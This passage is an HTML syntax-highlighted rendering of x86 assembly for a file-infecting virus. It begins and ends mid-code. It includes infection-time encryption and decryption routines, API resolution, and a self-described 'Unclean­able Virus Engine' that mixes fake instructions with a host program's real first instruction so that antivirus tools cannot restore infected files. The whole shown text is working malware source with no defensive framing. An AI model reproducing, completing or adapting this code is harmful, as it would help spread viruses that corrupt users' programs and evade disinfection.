                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">dif_point</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dif_p3</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">dif_p3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">seg</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dif_point2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">First_out</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">Infection_cryption</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncStart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EncLength</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Encrypt</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncStart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EncLength</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decrypt</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Decryption</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncStart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EncLength</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decrypt</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">



                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleProcAddress</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;                        UNCLEANABLE VIRUS ENGINE</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">

            </span><span class="sc1">; if CF is set, no mov ?s:reg32,imm32 was found, but it was</span><span class="sc0">
            </span><span class="sc1">;generated anyway.</span><span class="sc0">

</span><span class="sc1">; UVE: Engine parameters:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ESI: Offset where the first instruction is red from.</span><span class="sc0">
</span><span class="sc1">;       EDI: Offset where the code has to be written to</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Instruction</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; mov ebx, 12h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">
</span><span class="sc1">;                          INSTRUCTION CHECK</span><span class="sc0">
</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">


</span><span class="sc5">GetFirstInstruction</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">GetInstructionTrue</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">

            </span><span class="sc1">; First of all, check if there is a prefix</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">No_Shit</span><span class="sc0">         </span><span class="sc1">; This means no suitable instruction. So,</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">         </span><span class="sc1">;we just don't care but generate fake</span><span class="sc0">
            </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">No_Shit</span><span class="sc0">         </span><span class="sc1">;instructions :)</span><span class="sc0">
            </span><span class="sc1">; Go then to real instructions</span><span class="sc0">

</span><span class="sc5">MovRegImm</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Copy to our instruction buffer</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">No_Shit</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc1">; Well, there's no instruction. So, we must generate a fake one</span><span class="sc0">
            </span><span class="sc1">;to act as if it was legit in our code, then AVers mustn't know</span><span class="sc0">
            </span><span class="sc1">;even if I supressed any.</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; Times to do it</span><span class="sc0">
</span><span class="sc5">faker_nf</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; Length of instruction</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PrintFake</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">faker_nf</span><span class="sc0">
            </span><span class="sc6">stc</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; Adjust stack</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Ended_Stuff</span><span class="sc0">

</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">
</span><span class="sc1">;                             MARK OPCODE</span><span class="sc0">
</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; MarkOpcode: with the first instruction at hand, this function determines</span><span class="sc0">
</span><span class="sc1">;which opcode is affected by it. After that, it stores a value in the</span><span class="sc0">
</span><span class="sc1">;correct marker.</span><span class="sc0">

                </span><span class="sc1">;   EDI  ESI  EBP  ESP  EBX  EDX  ECX  EAX</span><span class="sc0">
</span><span class="sc5">Marker</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00010000b</span><span class="sc0">
</span><span class="sc5">MarkOpcode</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">; In case it's b8h-bfh</span><span class="sc0">
</span><span class="sc5">Opcode_Prefix</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc1">;            add     al,24d</span><span class="sc0">
            </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Marker</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">
</span><span class="sc1">;                             RANDOM SEED</span><span class="sc0">
</span><span class="sc1">;=========================*******************===============================</span><span class="sc0">

</span><span class="sc1">; GetRandomSeed/GetRandomNumber: Randomize functions.</span><span class="sc0">

</span><span class="sc5">GetRandomSeed</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">TimeKindOf</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_GetTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandomNumber</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Miliseconds</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1264h</span><span class="sc0">
         </span><span class="sc5">RndVal</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Second</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Miliseconds</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndVal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7d</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Miliseconds</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndVal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RndVal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Miliseconds</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11d</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">
</span><span class="sc1">;                           PRINT LEGIT/FAKE</span><span class="sc0">
</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">

</span><span class="sc5">secondary_buffer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">PrintLegit</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; The legit instruction</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">PrintFake</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; A random one</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomNumber</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0007h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08d</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Get reserved</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Marker</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">PrintFake</span><span class="sc0">          </span><span class="sc1">; Is it reserved ?</span><span class="sc0">


            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">secondary_buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

            </span><span class="sc1">; Now the fake instructions has to be printed. It's with the same</span><span class="sc0">
            </span><span class="sc1">;value of the legit one, so we must change that value.</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">; Now base pointer adjusts</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">stvalue</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomNumber</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">stvalue</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">


            </span><span class="sc1">; This can be enough. Now let's just copy it to our buffer.</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">
</span><span class="sc1">;                        GENERATE INSTRUCTIONS</span><span class="sc0">
</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">
</span><span class="sc1">; GenerateInstructions: this one will create instructions similar to the</span><span class="sc0">
</span><span class="sc1">;legit one, putting them into BufferInst. It will also put the legit one</span><span class="sc0">
</span><span class="sc1">;randomly among them.</span><span class="sc0">



</span><span class="sc5">GenerateInstructions</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; ecx is equal the number of opcodes</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Generated</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">GenInstrAgain</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomNumber</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LegGenerate</span><span class="sc0">
</span><span class="sc5">FakeIns</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PrintFake</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OneLess</span><span class="sc0">
</span><span class="sc5">LegGenerate</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Generated</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FakeIns</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PrintLegit</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Generated</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">OneLess</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GenInstrAgain</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Generated</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FinishedGenerating</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LegGenerate</span><span class="sc0">
</span><span class="sc5">FinishedGenerating</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">
</span><span class="sc1">;                         MAIN FUNCTION/DATA</span><span class="sc0">
</span><span class="sc1">;=====================***************************===========================</span><span class="sc0">
</span><span class="sc1">; GenerateInstructions: this one will create instructions similar to the</span><span class="sc0">
</span><span class="sc1">;legit one, putting them into BufferInst. It will also put the legit one</span><span class="sc0">
</span><span class="sc1">;randomly among them.</span><span class="sc0">

</span><span class="sc5">Generated</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">UVE</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomSeed</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFirstInstruction</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MarkOpcode</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
